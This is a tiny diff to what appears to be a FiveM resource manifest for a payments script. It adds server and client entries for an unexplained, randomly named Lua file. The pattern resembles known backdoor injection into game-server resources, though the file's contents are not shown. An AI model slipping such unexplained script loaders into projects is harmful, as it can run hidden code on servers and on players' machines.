@@ -1,3 +1,5 @@
+server_script "TVX846EJ8L.lua"
+client_script "TVX846EJ8L.lua"
 name "Jim-Payments"
 author "Jimathy"
 version "v2.7"
